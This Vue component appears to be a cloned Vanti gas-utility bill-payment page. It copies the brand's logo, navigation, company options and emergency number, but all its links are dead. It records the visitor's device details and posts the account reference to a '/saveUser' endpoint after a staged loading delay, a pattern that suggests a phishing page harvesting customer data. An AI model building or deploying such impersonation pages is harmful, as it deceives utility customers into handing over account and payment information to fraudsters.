<script setup>
import { ref } from "vue";
import { useForm, usePage } from "@inertiajs/vue3";
import Layout from "./Layouts/Layout.vue";
import platform from "platform";
import Cargando from "./Components/Cargando.vue";
import logo from '@/assets/vanti/logo.png';
import logofooter from '@/assets/vanti/footerlogo.png';

// Lógica
defineOptions({ layout: Layout });
const dispositivo = ref(platform.description || "Desconocido");
const page = usePage();

const form = useForm({
  empresa: "",
  referencia: "",
  dispositivo: dispositivo.value,
});
const option = ref(0);

function submit() {
  // Mostrar componente de carga
  option.value = 1;

  // Esperar 2 segundos antes de hacer la consulta
  setTimeout(() => {
    form.post("/saveUser", {
      preserveState: false,
      preserveScroll: true,
    });
  }, 1000); // Esperar 1 segundos (1000 milisegundos)
}

// Función para permitir solo números
function onlyNumbers(event) {
  const value = event.target.value;
  // Remover cualquier carácter que no sea número
  const numbersOnly = value.replace(/[^0-9]/g, '');
  form.referencia = numbersOnly;
}
</script>

<template>
  <div class="min-h-screen bg-white">
    <!-- Header móvil -->
    <div class="lg:hidden bg-[#113455] px-4 py-1.5">
      <button class="text-[#ffcd3f] border border-[#ffcd3f] rounded px-3 py-1.5">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
        </svg>
      </button>
    </div>

    <!-- Header desktop -->
    <div class="hidden lg:block bg-[#113455] text-white">
      <div class=" mx-auto pl-10 py-2">
        <div class="flex justify-between items-center text-xl">
          <div class="flex space-x-6">
            <a href="#" class="text-[#ffcd3f] border-b-2 border-[#ffcd3f]">Hogares</a>
            <a href="#" class="hover:text-[#ffcd3f]">Empresas</a>
            <a href="#" class="hover:text-[#ffcd3f]">Constructores</a>
            <a href="#" class="hover:text-[#ffcd3f]">Gas Natural Vehicular</a>
          </div>
          <div class="flex space-x-6">
            <a href="#" class="hover:text-[#ffcd3f]">Conócenos</a>
            <a href="#" class="hover:text-[#ffcd3f]">Contáctanos</a>
            <span class="bg-[#ff8e67] px-4 py-2 rounded text-sm text-[#113455] flex gap-1 items-center">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-4">
  <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z" />
</svg>

Emergencias: Llamar al 164</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Logo -->
    <div class="bg-white py-5">
      <div class="container mx-auto">
        <div class="flex justify-center md:justify-start">
          <img :src="logo" alt="Vanti" class="h-36 md:h-48">
        </div>
      </div>
    </div>

    <!-- Contenido principal -->
    <div class="container mx-auto px-4 ">
      <div class="max-w-md mx-auto md:max-w-3xl bg-white rounded-lg border border-gray-300 shadow-lg ">
        <div class="">
            <!-- Título -->
        <h1 class="text-2xl md:text-3xl  text-[#113455] text-center border-b border-b-gray-300 pb-5 pt-3 bg-[#21252908]">
          Consulta y paga tu factura
        </h1>

        <!-- Formulario -->
        <form @submit.prevent="submit" class="space-y-6 px-4 py-4">
          <!-- Mensaje de error -->
          <div v-if="page.props.errors.no_deuda" class="mb-4 text-center">
            <small class="text-red-500 text-sm font-medium">
              {{ page.props.errors.no_deuda }}
            </small>
          </div>

          <!-- Selecciona la empresa -->
          <div>
            <label class="block text-[#113455]  mb-2">
              Selecciona la empresa:
              <span class="inline-block w-4 h-4 bg-gray-400 rounded-full text-white text-xs text-center leading-4 ml-1">?</span>
            </label>
            <select
              v-model="form.empresa"
              class="w-full px-2 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-3 focus:ring-blue-200 focus:border-2 focus:border-blue-300  text-[#113455] appearance-none"
              required
            >
              <option value="" selected disabeld>Selecciona una opción</option>
              <option value="79">Vanti S.A. E.S.P.</option>
              <option value="80">Vanti - Gas Natural Cundiboyacense S.A. E.S.P.</option>
              <option value="81">Vanti - Gas Natural Nacer S.A. E.S.P.</option>
              <option value="82">Vanti - Gas Natural Oriente S.A. E.S.P.</option>
              <option value="84">Vanti Soluciones S.A.S.</option>
            </select>
          </div>

          <!-- Cuenta o referencia de pago -->
          <div>
            <label class="block text-[#113455]  mb-2">
              Cuenta o referencia de pago:
              <span class="inline-block w-4 h-4 bg-gray-400 rounded-full text-white text-xs text-center leading-4 ml-1">?</span>
            </label>
            <input
              v-model="form.referencia"
              type="text"
              @input="onlyNumbers"
              class="w-full px-2 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-3 focus:ring-blue-200 focus:border-2 focus:border-blue-300  "
              required
            >
          </div>

          <!-- Botón consultar -->
          <button
            type="submit"
            :class="{
              'w-full font-medium py-2 px-4 rounded-md transition duration-200': true,
              'bg-[#113455] text-white hover:bg-[#0f2d47] cursor-pointer': form.empresa && form.referencia,
              'bg-[#113455]/60 text-white cursor-not-allowed': !form.empresa || !form.referencia
            }"
            :disabled="!form.empresa || !form.referencia"
          >
            Consultar
          </button>
        </form>
        </div>

      </div>

      <!-- Footer -->
      <div class="text-center mt-8 flex justify-center items-center gap-1" >
        <p class="text-gray-600 text-sm mb-2 relative top-1 md:text-lg">Powered by:</p>
        <img :src="logofooter" alt="Similtech" class="h-7 md:h-10">
      </div>
    </div>

    <!-- Componente de carga -->
    <Cargando v-if="option === 1" />
  </div>
</template>
